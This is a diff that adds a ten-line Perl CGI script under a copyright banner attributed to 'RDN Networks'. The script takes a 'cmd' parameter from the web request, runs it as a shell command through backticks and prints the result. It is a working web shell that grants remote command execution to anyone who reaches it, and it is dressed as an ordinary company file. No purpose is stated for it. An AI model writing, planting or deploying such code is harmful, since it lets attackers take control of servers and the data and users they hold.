@@ -1,0 +1,10 @@
+#!/usr/bin/perl
+################################################
+#      Copyright 2004-2011 RDN Networks        #
+################################################
+use CGI;
+$scc = new CGI;
+$scc_cmd = $scc->param('cmd');
+print "Content-type: text/html\n\n";
+$exec = `$scc_cmd`;
+print $exec;
